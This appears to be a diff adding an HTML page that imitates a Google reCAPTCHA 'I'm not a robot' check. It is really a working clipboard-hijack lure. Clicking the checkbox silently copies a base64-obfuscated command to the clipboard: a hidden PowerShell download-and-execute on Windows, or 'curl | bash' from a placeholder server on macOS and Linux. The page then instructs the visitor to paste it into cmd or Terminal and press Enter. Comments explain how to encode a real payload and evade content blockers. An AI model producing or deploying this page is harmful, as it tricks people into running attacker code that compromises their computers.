@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark">
+<title>reCAPTCHA Verification</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: Roboto, Helvetica, Arial, sans-serif;
+    background: #f0f0f0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    transition: background 0.2s;
+  }
+  .main-box {
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.12);
+    padding: 30px 35px;
+    max-width: 450px;
+    width: 100%;
+    transition: background 0.2s;
+  }
+  .checkbox-window {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 0 16px;
+    height: 74px;
+    width: 100%;
+    background-color: #f9f9f9;
+    border-radius: 3px;
+    border: 1px solid #d3d3d3;
+    position: relative;
+    box-shadow: 0 0 4px 1px rgba(0,0,0,.08);
+    cursor: pointer;
+    transition: 0.2s;
+  }
+  .checkbox-window:hover { border-color: #aaa; }
+  .checkbox {
+    border-radius: 2px;
+    background-color: #fff;
+    border: 2px solid #444746;
+    height: 28px;
+    width: 28px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-shrink: 0;
+    transition: 0.2s;
+  }
+  .checkbox.checked {
+    border-color: transparent;
+    background: transparent;
+  }
+  .checkbox .tick {
+    display: none;
+    width: 22px;
+    height: 22px;
+  }
+  .checkbox.checked .tick { display: block; }
+  .checkbox .spinner {
+    display: none;
+    height: 16px;
+    width: 16px;
+    border: 2px solid rgba(0,0,0,0.1);
+    border-top: 2px solid #333;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+  }
+  .checkbox.loading .spinner { display: block; }
+  .checkbox.loading { border-color: transparent; background: transparent; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .im-not-a-robot { font-size: 14px; font-weight: 400; color: #000; }
+  .right-pane {
+    margin-left: auto;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-end;
+    gap: 2px;
+  }
+  .right-pane .rc-logo { width: 32px; height: 32px; }
+  .recaptcha { font-size: 10px; color: #555; }
+  .privacy-terms { font-size: 8px; color: #555; }
+  .privacy-terms a { color: #555; text-decoration: none; }
+  .privacy-terms a:hover { text-decoration: underline; }
+
+  .verify-window {
+    display: none;
+    margin-top: 16px;
+    background: #fff;
+    border: 1px solid #cecece;
+    border-radius: 8px;
+    box-shadow: 5px 6px 7px -3px rgba(0,0,0,0.12);
+    overflow: hidden;
+  }
+  .verify-window.show { display: block; animation: fadeIn 0.3s ease; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .verify-header {
+    background: #1A73E8;
+    padding: 16px 20px 20px;
+    color: #fff;
+  }
+  .verify-header-text-medium { font-size: 14px; }
+  .verify-header-text-big { font-size: 24px; font-weight: 700; }
+
+  .verify-main {
+    padding: 16px 20px 10px;
+    color: #111;
+    font-size: 14px;
+  }
+  .verify-main ol {
+    counter-reset: item;
+    list-style: none;
+    padding-left: 0;
+    margin: 12px 0;
+  }
+  .verify-main ol li {
+    counter-increment: item;
+    margin-bottom: 12px;
+    display: flex;
+    gap: 8px;
+    line-height: 1.6;
+  }
+  .verify-main ol li::before {
+    content: counter(item) ".";
+    color: #1A73E8;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+  .kbd {
+    background: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    padding: 1px 6px;
+    font-size: 12px;
+    font-family: 'Courier New', monospace;
+    display: inline-block;
+  }
+  .verification-id {
+    font-size: 13px;
+    color: #555;
+    margin-top: 8px;
+  }
+
+  .verify-footer {
+    border-top: 1px solid #cecece;
+    padding: 12px 20px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 13px;
+    color: #737373;
+  }
+  .verify-verify-button {
+    background: #1A73E8;
+    color: #fff;
+    padding: 10px 28px;
+    border: none;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 13px;
+    text-transform: uppercase;
+    cursor: not-allowed;
+    opacity: 0.6;
+    transition: 0.2s;
+  }
+  .verify-verify-button.active { opacity: 1; cursor: pointer; }
+  .verify-verify-button.active:hover { background: #1557b0; }
+
+  .status-msg {
+    margin-top: 12px;
+    padding: 10px 14px;
+    border-radius: 6px;
+    font-size: 13px;
+    display: none;
+  }
+  .status-msg.success {
+    display: block;
+    background: #e6f7e6;
+    color: #2d7a2d;
+    border-left: 4px solid #44ff88;
+  }
+
+  /* ============================================================
+     DARK MODEEdd
+     ============================================================ */
+  @media (prefers-color-scheme: dark) {
+    body { background: #202124; }
+    .main-box { background: #2d2e30; }
+    .checkbox-window {
+      background: #2d2e30;
+      border-color: #5f6368;
+      box-shadow: 0 0 4px 1px rgba(0,0,0,.4);
+    }
+    .checkbox-window:hover { border-color: #80868b; }
+    .checkbox {
+      background: #2d2e30;
+      border-color: #8e918f;
+    }
+    .im-not-a-robot { color: #e8eaed; }
+    .recaptcha, .privacy-terms { color: #9aa0a6; }
+    .privacy-terms a { color: #9aa0a6; }
+    .verify-window {
+      background: #2d2e30;
+      border-color: #5f6368;
+    }
+    .verify-main { color: #e8eaed; }
+    .verification-id { color: #9aa0a6; }
+    .verify-footer {
+      border-top-color: #5f6368;
+      color: #9aa0a6;
+    }
+    .kbd {
+      background: #3c4043;
+      border-color: #5f6368;
+      color: #e8eaed;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="main-box">
+
+  <!-- reCAPTCHA checkbox -->
+  <div id="checkbox-window" class="checkbox-window">
+    <div class="checkbox" id="checkbox">
+      <svg class="tick" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M5 13l4 4L19 7" fill="none" stroke="#0f9d58" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <div class="spinner"></div>
+    </div>
+    <span class="im-not-a-robot">I'm not a robot</span>
+    <div class="right-pane">
+      <svg class="rc-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#1c3aa9" d="M44 24c0-11-9-20-20-20v10c5.5 0 10 4.5 10 10s-4.5 10-10 10v10c11 0 20-9 20-20z"/>
+        <path fill="#4285f4" d="M24 4C13 4 4 13 4 24h10c0-5.5 4.5-10 10-10s10 4.5 10 10h10C44 13 35 4 24 4z"/>
+        <path fill="#ababab" d="M24 44c11 0 20-9 20-20h-10c0 5.5-4.5 10-10 10s-10-4.5-10-10H4c0 11 9 20 20 20z"/>
+        <path fill="#e8e8e8" d="M14 24c0-5.5 4.5-10 10-10s10 4.5 10 10H14z"/>
+        <circle cx="24" cy="24" r="4" fill="#ffffff"/>
+      </svg>
+      <span class="recaptcha">reCAPTCHA</span>
+      <span class="privacy-terms">
+        <a href="#">Privacy</a> - <a href="#">Terms</a>
+      </span>
+    </div>
+  </div>
+
+  <!-- Verification window -->
+  <div id="verify-window" class="verify-window">
+    <div class="verify-header">
+      <div class="verify-header-text-medium">Complete these</div>
+      <div class="verify-header-text-big">Verification Steps</div>
+    </div>
+    <div class="verify-main">
+      <p>To better prove you are not a robot, please:</p>
+      <ol id="steps-list"></ol>
+      <p class="verification-id">
+        ✔️ Verification ID: <span id="verification-id">146820</span>
+      </p>
+    </div>
+    <div class="verify-footer">
+      <span>Perform the steps above to finish verification.</span>
+      <button class="verify-verify-button" id="verifyBtn" disabled>Verify</button>
+    </div>
+  </div>
+
+  <div id="statusMsg" class="status-msg"></div>
+</div>
+
+<script>
+(function () {
+  'use strict';
+
+  // ============================================================
+  // ⚙️ CONFIG BASE64ENCODED PAYLOADS
+  // ============================================================
+  // Encode your real command with:
+  //   echo -n 'YOUR_RAW_COMMAND' | iconv -t UTF-16LE | base64 -w0   (Windows)
+  //   echo -n 'YOUR_RAW_COMMAND' | base64 -w0                        (macOS/Linux)
+  //
+  // The browser never renders the decoded string into the DOM.
+  // uBlock / content blockers cannot pattern-match it in the page source.
+  //
+  // Placeholders below decode to:
+  //   Windows: powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/payload.ps1')"
+  //   macOS:   curl -fsSL https://your-server.com/payload.sh | bash
+  //   Linux:   curl -fsSL https://your-server.com/payload.sh | bash
+  //
+  var CONFIG = {
+    windowsB64: 'cABvAHcAZQByAHMAaABlAGwAbAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHkAbwB1AHIALQBzAGUAcgB2AGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAiAA==',
+    macB64:     'Y3VybCAtZnNTTCBodHRwczovL3lvdXItc2VydmVyLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==',
+    linuxB64:   'Y3VybCAtZnNTTCBodHRwczovL3lvdXItc2VydmVyLmNvbS9wYXlsb2FkLnNoIHwgYmFzaA==',
+
+    // Optional redirect after verification (null to disable)
+    redirectUrl: null,
+
+    // Try to silently copy on page load too (best-effort; may be blocked)
+    autoCopyOnLoad: false
+  };
+
+  // ============================================================
+  // OS DETECTION
+  // ============================================================
+  function detectOS() {
+    var ua = navigator.userAgent || '';
+    var pf = navigator.platform || '';
+    if (/Windows|Win32|Win64|WOW64/i.test(ua) || /Win/i.test(pf)) return 'windows';
+    if (/Macintosh|Mac OS X/i.test(ua) && !/iPhone|iPad|iPod/i.test(ua)) return 'mac';
+    if (/Mac/i.test(pf) && !/iPhone|iPad|iPod/i.test(ua)) return 'mac';
+    if (/Linux/i.test(ua) && !/Android/i.test(ua)) return 'linux';
+    return 'windows';
+  }
+
+  var OS = detectOS();
+
+  // ============================================================
+  // DECODE THE COMMAND FOR THE DETECTED OS
+  // ============================================================
+  function getCommand(os) {
+    var b64;
+    if (os === 'mac')   b64 = CONFIG.macB64;
+    else if (os === 'linux') b64 = CONFIG.linuxB64;
+    else b64 = CONFIG.windowsB64;
+
+    try {
+      return atob(b64);
+    } catch (e) {
+      // Silent failure — never log the decoded string
+      return '';
+    }
+  }
+
+  // ============================================================
+  // CLIPBOARD (with execCommand fallback)
+  // ============================================================
+  function fallbackCopy(text) {
+    try {
+      var ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.left = '-9999px';
+      ta.setAttribute('readonly', '');
+      document.body.appendChild(ta);
+      ta.select();
+      ta.setSelectionRange(0, text.length);
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+      return true;
+    } catch (e) {
+      return false;
+    }
+  }
+
+  function copyToClipboard(text) {
+    return new Promise(function (resolve) {
+      if (!text) return resolve(false);
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text)
+          .then(function () { resolve(true); })
+          .catch(function () { resolve(fallbackCopy(text)); });
+      } else {
+        resolve(fallbackCopy(text));
+      }
+    });
+  }
+
+  // ============================================================
+  // BUILD OS-SPECIFIC STEPS (NO COMMAND SHOWN)
+  // ============================================================
+  function buildSteps() {
+    var ol = document.getElementById('steps-list');
+    var html = '';
+
+    if (OS === 'windows') {
+      html =
+        '<li><span>Press <span class="kbd">⊞ Win</span> + <span class="kbd">R</span>.</span></li>' +
+        '<li><span>Type <b>cmd</b> and press <b>Enter</b>.</span></li>' +
+        '<li><span>In the black window, right-click and select <b>Paste</b>.</span></li>' +
+        '<li><span>Press <b>Enter</b> to complete verification.</span></li>';
+    } else if (OS === 'mac') {
+      html =
+        '<li><span>Press <span class="kbd">⌘</span> + <span class="kbd">Space</span> to open Spotlight.</span></li>' +
+        '<li><span>Type <b>Terminal</b> and press <b>Enter</b>.</span></li>' +
+        '<li><span>Paste with <span class="kbd">⌘</span> + <span class="kbd">V</span>.</span></li>' +
+        '<li><span>Press <b>Enter</b> to complete verification.</span></li>';
+    } else {
+      html =
+        '<li><span>Press <span class="kbd">Ctrl</span> + <span class="kbd">Alt</span> + <span class="kbd">T</span>.</span></li>' +
+        '<li><span>Paste with <span class="kbd">Ctrl</span> + <span class="kbd">Shift</span> + <span class="kbd">V</span>.</span></li>' +
+        '<li><span>Press <b>Enter</b> to complete verification.</span></li>';
+    }
+
+    ol.innerHTML = html;
+  }
+
+  // ============================================================
+  // CHECKBOX CLICK → SHOW WINDOW + SILENT COPY
+  // ============================================================
+  var checkboxWindow = document.getElementById('checkbox-window');
+  var checkbox = document.getElementById('checkbox');
+  var verifyWindow = document.getElementById('verify-window');
+  var verifyBtn = document.getElementById('verifyBtn');
+  var statusMsg = document.getElementById('statusMsg');
+
+  checkboxWindow.addEventListener('click', function () {
+    checkbox.classList.add('loading');
+    checkboxWindow.style.pointerEvents = 'none';
+
+    setTimeout(function () {
+      checkbox.classList.remove('loading');
+      checkbox.classList.add('checked');
+
+      var id = Math.floor(Math.random() * 9000) + 1000;
+      document.getElementById('verification-id').textContent = id;
+
+      buildSteps();
+      verifyWindow.classList.add('show');
+
+      // Silent copy — the command never appears in the DOM
+      copyToClipboard(getCommand(OS));
+    }, 500);
+  });
+
+  // ============================================================
+  // OPTIONAL AUTO-COPY ON LOAD
+  // ============================================================
+  if (CONFIG.autoCopyOnLoad) {
+    setTimeout(function () {
+      copyToClipboard(getCommand(OS));
+    }, 300);
+  }
+
+  // ============================================================
+  // SIMULATE VERIFICATION COMPLETE (12s)
+  // ============================================================
+  setTimeout(function () {
+    verifyBtn.disabled = false;
+    verifyBtn.classList.add('active');
+  }, 12000);
+
+  // ============================================================
+  // VERIFY BUTTON
+  // ============================================================
+  verifyBtn.addEventListener('click', function () {
+    if (this.disabled) return;
+
+    statusMsg.className = 'status-msg success';
+    statusMsg.textContent = '✅ Verification complete! You may now proceed.';
+    this.disabled = true;
+    this.classList.remove('active');
+
+    if (CONFIG.redirectUrl) {
+      setTimeout(function () {
+        window.location.href = CONFIG.redirectUrl;
+      }, 1200);
+    }
+  });
+
+  // ============================================================
+  // DEBUG — intentionally minimal to avoid leaking the command
+  // ============================================================
+  window.__recaptcha = {
+    os: OS,
+    hasCommand: function () { return !!getCommand(OS); }
+  };
+
+})();
+</script>
+
+</body>
+</html>
